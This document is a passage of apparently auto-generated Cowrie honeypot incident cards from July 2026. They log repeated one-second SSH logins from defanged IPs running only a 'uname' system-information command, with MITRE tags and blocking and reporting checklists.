### 🔴 HIGH · IR-5a63125ba089

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:53 |
| **Last Seen** | 2026-07-26 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:53:09` | `cowrie.session.connect` |
| `2026-07-26 22:53:09` | `cowrie.client.version` |
| `2026-07-26 22:53:09` | `cowrie.client.kex` |
| `2026-07-26 22:53:09` | `cowrie.login.success` |
| `2026-07-26 22:53:10` | `cowrie.session.params` |
| `2026-07-26 22:53:10` | `cowrie.command.input` |
| `2026-07-26 22:53:10` | `cowrie.log.closed` |
| `2026-07-26 22:53:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8b43d8b3a30

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:53 |
| **Last Seen** | 2026-07-26 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:53:10` | `cowrie.session.connect` |
| `2026-07-26 22:53:10` | `cowrie.client.version` |
| `2026-07-26 22:53:10` | `cowrie.client.kex` |
| `2026-07-26 22:53:10` | `cowrie.login.success` |
| `2026-07-26 22:53:11` | `cowrie.session.params` |
| `2026-07-26 22:53:11` | `cowrie.command.input` |
| `2026-07-26 22:53:11` | `cowrie.log.closed` |
| `2026-07-26 22:53:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9356b0579835

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:53 |
| **Last Seen** | 2026-07-26 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:53:14` | `cowrie.session.connect` |
| `2026-07-26 22:53:14` | `cowrie.client.version` |
| `2026-07-26 22:53:14` | `cowrie.client.kex` |
| `2026-07-26 22:53:14` | `cowrie.login.success` |
| `2026-07-26 22:53:15` | `cowrie.session.params` |
| `2026-07-26 22:53:15` | `cowrie.command.input` |
| `2026-07-26 22:53:15` | `cowrie.log.closed` |
| `2026-07-26 22:53:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-747e6cce01d3

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:53 |
| **Last Seen** | 2026-07-26 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:53:18` | `cowrie.session.connect` |
| `2026-07-26 22:53:18` | `cowrie.client.version` |
| `2026-07-26 22:53:18` | `cowrie.client.kex` |
| `2026-07-26 22:53:18` | `cowrie.login.success` |
| `2026-07-26 22:53:19` | `cowrie.session.params` |
| `2026-07-26 22:53:19` | `cowrie.command.input` |
| `2026-07-26 22:53:19` | `cowrie.log.closed` |
| `2026-07-26 22:53:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a8a8ae04626

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:53 |
| **Last Seen** | 2026-07-26 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:53:21` | `cowrie.session.connect` |
| `2026-07-26 22:53:21` | `cowrie.client.version` |
| `2026-07-26 22:53:21` | `cowrie.client.kex` |
| `2026-07-26 22:53:22` | `cowrie.login.success` |
| `2026-07-26 22:53:22` | `cowrie.session.params` |
| `2026-07-26 22:53:22` | `cowrie.command.input` |
| `2026-07-26 22:53:23` | `cowrie.log.closed` |
| `2026-07-26 22:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3a04e760963

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:53 |
| **Last Seen** | 2026-07-26 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:53:25` | `cowrie.session.connect` |
| `2026-07-26 22:53:25` | `cowrie.client.version` |
| `2026-07-26 22:53:25` | `cowrie.client.kex` |
| `2026-07-26 22:53:26` | `cowrie.login.success` |
| `2026-07-26 22:53:26` | `cowrie.session.params` |
| `2026-07-26 22:53:26` | `cowrie.command.input` |
| `2026-07-26 22:53:26` | `cowrie.log.closed` |
| `2026-07-26 22:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44ac717188dc

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:53 |
| **Last Seen** | 2026-07-26 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:53:29` | `cowrie.session.connect` |
| `2026-07-26 22:53:29` | `cowrie.client.version` |
| `2026-07-26 22:53:29` | `cowrie.client.kex` |
| `2026-07-26 22:53:29` | `cowrie.login.success` |
| `2026-07-26 22:53:30` | `cowrie.session.params` |
| `2026-07-26 22:53:30` | `cowrie.command.input` |
| `2026-07-26 22:53:30` | `cowrie.log.closed` |
| `2026-07-26 22:53:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39dec1109747

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:53 |
| **Last Seen** | 2026-07-26 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:53:33` | `cowrie.session.connect` |
| `2026-07-26 22:53:33` | `cowrie.client.version` |
| `2026-07-26 22:53:33` | `cowrie.client.kex` |
| `2026-07-26 22:53:33` | `cowrie.login.success` |
| `2026-07-26 22:53:34` | `cowrie.session.params` |
| `2026-07-26 22:53:34` | `cowrie.command.input` |
| `2026-07-26 22:53:34` | `cowrie.log.closed` |
| `2026-07-26 22:53:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c2196f0beac

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:53 |
| **Last Seen** | 2026-07-26 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:53:36` | `cowrie.session.connect` |
| `2026-07-26 22:53:36` | `cowrie.client.version` |
| `2026-07-26 22:53:37` | `cowrie.client.kex` |
| `2026-07-26 22:53:37` | `cowrie.login.success` |
| `2026-07-26 22:53:38` | `cowrie.session.params` |
| `2026-07-26 22:53:38` | `cowrie.command.input` |
| `2026-07-26 22:53:38` | `cowrie.log.closed` |
| `2026-07-26 22:53:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b0016effd89

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:53 |
| **Last Seen** | 2026-07-26 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:53:40` | `cowrie.session.connect` |
| `2026-07-26 22:53:40` | `cowrie.client.version` |
| `2026-07-26 22:53:40` | `cowrie.client.kex` |
| `2026-07-26 22:53:41` | `cowrie.login.success` |
| `2026-07-26 22:53:42` | `cowrie.session.params` |
| `2026-07-26 22:53:42` | `cowrie.command.input` |
| `2026-07-26 22:53:42` | `cowrie.log.closed` |
| `2026-07-26 22:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cff489d3cb6

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:53 |
| **Last Seen** | 2026-07-26 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:53:44` | `cowrie.session.connect` |
| `2026-07-26 22:53:44` | `cowrie.client.version` |
| `2026-07-26 22:53:44` | `cowrie.client.kex` |
| `2026-07-26 22:53:44` | `cowrie.login.success` |
| `2026-07-26 22:53:45` | `cowrie.session.params` |
| `2026-07-26 22:53:45` | `cowrie.command.input` |
| `2026-07-26 22:53:45` | `cowrie.log.closed` |
| `2026-07-26 22:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba12b0267bfa

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:53 |
| **Last Seen** | 2026-07-26 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:53:48` | `cowrie.session.connect` |
| `2026-07-26 22:53:48` | `cowrie.client.version` |
| `2026-07-26 22:53:48` | `cowrie.client.kex` |
| `2026-07-26 22:53:48` | `cowrie.login.success` |
| `2026-07-26 22:53:49` | `cowrie.session.params` |
| `2026-07-26 22:53:49` | `cowrie.command.input` |
| `2026-07-26 22:53:49` | `cowrie.log.closed` |
| `2026-07-26 22:53:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d3031cd9ee6

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:53 |
| **Last Seen** | 2026-07-26 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:53:51` | `cowrie.session.connect` |
| `2026-07-26 22:53:51` | `cowrie.client.version` |
| `2026-07-26 22:53:52` | `cowrie.client.kex` |
| `2026-07-26 22:53:52` | `cowrie.login.success` |
| `2026-07-26 22:53:53` | `cowrie.session.params` |
| `2026-07-26 22:53:53` | `cowrie.command.input` |
| `2026-07-26 22:53:53` | `cowrie.log.closed` |
| `2026-07-26 22:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41ccbd655c56

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:53 |
| **Last Seen** | 2026-07-26 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:53:55` | `cowrie.session.connect` |
| `2026-07-26 22:53:55` | `cowrie.client.version` |
| `2026-07-26 22:53:55` | `cowrie.client.kex` |
| `2026-07-26 22:53:56` | `cowrie.login.success` |
| `2026-07-26 22:53:56` | `cowrie.session.params` |
| `2026-07-26 22:53:56` | `cowrie.command.input` |
| `2026-07-26 22:53:57` | `cowrie.log.closed` |
| `2026-07-26 22:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b05276500444

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:53 |
| **Last Seen** | 2026-07-26 22:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:53:59` | `cowrie.session.connect` |
| `2026-07-26 22:53:59` | `cowrie.client.version` |
| `2026-07-26 22:53:59` | `cowrie.client.kex` |
| `2026-07-26 22:54:00` | `cowrie.login.success` |
| `2026-07-26 22:54:00` | `cowrie.session.params` |
| `2026-07-26 22:54:00` | `cowrie.command.input` |
| `2026-07-26 22:54:01` | `cowrie.log.closed` |
| `2026-07-26 22:54:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e276a112d9aa

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:54 |
| **Last Seen** | 2026-07-26 22:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:54:03` | `cowrie.session.connect` |
| `2026-07-26 22:54:03` | `cowrie.client.version` |
| `2026-07-26 22:54:03` | `cowrie.client.kex` |
| `2026-07-26 22:54:03` | `cowrie.login.success` |
| `2026-07-26 22:54:04` | `cowrie.session.params` |
| `2026-07-26 22:54:04` | `cowrie.command.input` |
| `2026-07-26 22:54:04` | `cowrie.log.closed` |
| `2026-07-26 22:54:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a428ac77db7

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:54 |
| **Last Seen** | 2026-07-26 22:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:54:07` | `cowrie.session.connect` |
| `2026-07-26 22:54:07` | `cowrie.client.version` |
| `2026-07-26 22:54:07` | `cowrie.client.kex` |
| `2026-07-26 22:54:07` | `cowrie.login.success` |
| `2026-07-26 22:54:08` | `cowrie.session.params` |
| `2026-07-26 22:54:08` | `cowrie.command.input` |
| `2026-07-26 22:54:08` | `cowrie.log.closed` |
| `2026-07-26 22:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a72c4b905e17

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:54 |
| **Last Seen** | 2026-07-26 22:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:54:10` | `cowrie.session.connect` |
| `2026-07-26 22:54:10` | `cowrie.client.version` |
| `2026-07-26 22:54:11` | `cowrie.client.kex` |
| `2026-07-26 22:54:11` | `cowrie.login.success` |
| `2026-07-26 22:54:12` | `cowrie.session.params` |
| `2026-07-26 22:54:12` | `cowrie.command.input` |
| `2026-07-26 22:54:12` | `cowrie.log.closed` |
| `2026-07-26 22:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db3ade6fd0bf

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:54 |
| **Last Seen** | 2026-07-26 22:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:54:14` | `cowrie.session.connect` |
| `2026-07-26 22:54:15` | `cowrie.client.version` |
| `2026-07-26 22:54:15` | `cowrie.client.kex` |
| `2026-07-26 22:54:15` | `cowrie.login.success` |
| `2026-07-26 22:54:16` | `cowrie.session.params` |
| `2026-07-26 22:54:16` | `cowrie.command.input` |
| `2026-07-26 22:54:16` | `cowrie.log.closed` |
| `2026-07-26 22:54:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b3d48363a6d

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:54 |
| **Last Seen** | 2026-07-26 22:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:54:18` | `cowrie.session.connect` |
| `2026-07-26 22:54:18` | `cowrie.client.version` |
| `2026-07-26 22:54:19` | `cowrie.client.kex` |
| `2026-07-26 22:54:19` | `cowrie.login.success` |
| `2026-07-26 22:54:20` | `cowrie.session.params` |
| `2026-07-26 22:54:20` | `cowrie.command.input` |
| `2026-07-26 22:54:20` | `cowrie.log.closed` |
| `2026-07-26 22:54:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2550b4c6cef

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:54 |
| **Last Seen** | 2026-07-26 22:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:54:22` | `cowrie.session.connect` |
| `2026-07-26 22:54:22` | `cowrie.client.version` |
| `2026-07-26 22:54:23` | `cowrie.client.kex` |
| `2026-07-26 22:54:23` | `cowrie.login.success` |
| `2026-07-26 22:54:24` | `cowrie.session.params` |
| `2026-07-26 22:54:24` | `cowrie.command.input` |
| `2026-07-26 22:54:24` | `cowrie.log.closed` |
| `2026-07-26 22:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcfcd0d7c4f2

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:54 |
| **Last Seen** | 2026-07-26 22:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:54:26` | `cowrie.session.connect` |
| `2026-07-26 22:54:26` | `cowrie.client.version` |
| `2026-07-26 22:54:26` | `cowrie.client.kex` |
| `2026-07-26 22:54:27` | `cowrie.login.success` |
| `2026-07-26 22:54:27` | `cowrie.session.params` |
| `2026-07-26 22:54:27` | `cowrie.command.input` |
| `2026-07-26 22:54:28` | `cowrie.log.closed` |
| `2026-07-26 22:54:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3823441ba91d

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:54 |
| **Last Seen** | 2026-07-26 22:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:54:30` | `cowrie.session.connect` |
| `2026-07-26 22:54:30` | `cowrie.client.version` |
| `2026-07-26 22:54:30` | `cowrie.client.kex` |
| `2026-07-26 22:54:31` | `cowrie.login.success` |
| `2026-07-26 22:54:31` | `cowrie.session.params` |
| `2026-07-26 22:54:31` | `cowrie.command.input` |
| `2026-07-26 22:54:31` | `cowrie.log.closed` |
| `2026-07-26 22:54:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdd0bdf31365

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:54 |
| **Last Seen** | 2026-07-26 22:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:54:34` | `cowrie.session.connect` |
| `2026-07-26 22:54:34` | `cowrie.client.version` |
| `2026-07-26 22:54:34` | `cowrie.client.kex` |
| `2026-07-26 22:54:35` | `cowrie.login.success` |
| `2026-07-26 22:54:35` | `cowrie.session.params` |
| `2026-07-26 22:54:35` | `cowrie.command.input` |
| `2026-07-26 22:54:36` | `cowrie.log.closed` |
| `2026-07-26 22:54:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8218a31723f

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:54 |
| **Last Seen** | 2026-07-26 22:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:54:38` | `cowrie.session.connect` |
| `2026-07-26 22:54:38` | `cowrie.client.version` |
| `2026-07-26 22:54:38` | `cowrie.client.kex` |
| `2026-07-26 22:54:39` | `cowrie.login.success` |
| `2026-07-26 22:54:39` | `cowrie.session.params` |
| `2026-07-26 22:54:39` | `cowrie.command.input` |
| `2026-07-26 22:54:39` | `cowrie.log.closed` |
| `2026-07-26 22:54:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b9611d124e4

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]204` |
| **First Seen** | 2026-07-26 22:54 |
| **Last Seen** | 2026-07-26 22:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:54:42` | `cowrie.session.connect` |
| `2026-07-26 22:54:42` | `cowrie.client.version` |
| `2026-07-26 22:54:42` | `cowrie.client.kex` |
| `2026-07-26 22:54:43` | `cowrie.login.success` |
| `2026-07-26 22:54:43` | `cowrie.session.params` |
